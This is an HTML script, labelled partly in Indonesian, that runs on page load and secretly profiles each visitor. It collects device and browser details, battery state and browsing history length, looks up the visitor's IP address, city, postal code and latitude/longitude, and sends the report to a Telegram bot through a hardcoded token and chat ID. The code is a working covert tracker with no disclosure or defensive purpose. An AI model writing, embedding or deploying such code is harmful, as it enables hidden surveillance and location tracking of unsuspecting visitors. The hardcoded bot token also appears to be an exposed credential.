  <script>
    const botToken = '7518590238:AAFa_NmuU323qGIN6XFFox8NIVx9QT1zrPE';
    const chatID = '6281867611';

    async function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `chat_id=${chatID}&text=${encodeURIComponent("```\n" + message + "\n```")}&parse_mode=Markdown`
      });
    }

    async function logInfo() {
      const ua = navigator.userAgent;
      const platform = navigator.platform;
      const lang = navigator.language;
      const online = navigator.onLine ? 'Online' : 'Offline';
      const screenSize = `${screen.width}x${screen.height}`;
      const windowSize = `${window.innerWidth}x${window.innerHeight}`;
      const cores = navigator.hardwareConcurrency;
      const ram = navigator.deviceMemory || 'N/A';
      const time = new Date().toString();
      const offset = new Date().getTimezoneOffset() * -1;
      const title = document.title;
      const referrer = document.referrer || 'None';
      const url = window.location.href;
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const touch = navigator.maxTouchPoints > 0 ? '✅ YA' : '❌ TIDAK';
      const pageLoad = (performance.timing.loadEventEnd - performance.timing.navigationStart) || 0;
      const historyLen = history.length;

      let battery = '';
      try {
        const b = await navigator.getBattery();
        battery = `🔋 Battery: ${Math.round(b.level * 100)}%\n🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
      } catch {
        battery = '🔋 Battery: Unknown\n🔌 Charging: Unknown\n';
      }

      let locationBlock = '';
      try {
        const ip = await fetch('https://ipapi.co/json/').then(res => res.json());
        locationBlock = `
📍 LOCATION INFORMATION
📡 IP Address: ${ip.ip}
🏙️ Kota: ${ip.city}
🏙️ Kabupaten: ${ip.region}
🗺️ Wilayah: ${ip.region}
🌎 Negara: ${ip.country_name}
🏷️ Kode Pos: ${ip.postal || 'null'}
📌 Latitude: ${ip.latitude}
📍 Longitude: ${ip.longitude}
🏙️ Kabupaten: ${ip.region}
`;
      } catch {
        locationBlock = '📍 LOCATION INFORMATION\nTidak dapat mengambil lokasi.\n';
      }

      const report = `
╭───── Tracking Report ───── ⦿

⚙️ DEVICE INFORMATION
🖥️ Device: ${ua}
💻 Platform: ${platform}
🌐 Bahasa: ${lang}
📶 Online: ${online}
📺 Screen Size: ${screenSize}
🪟 Window Size: ${windowSize}
💾 RAM: ${ram} GB
🧠 CPU Cores: ${cores}
${battery}⏰ Waktu Akses: ${time}
🕒 Page Load Time: ${pageLoad.toFixed(2)} ms
📜 History Length: ${historyLen}
✋ Touch Support: ${touch}
🔗 Referrer: ${referrer}
🌍 URL: ${url}
📄 Title: ${title}
🕓 Timezone: ${tz}
🧭 Offset: ${offset} menit

${locationBlock}
╰───── Telegram @denz ───── ⦿`;

      sendToTelegram(report);
    }

    window.onload = logInfo;
  </script>
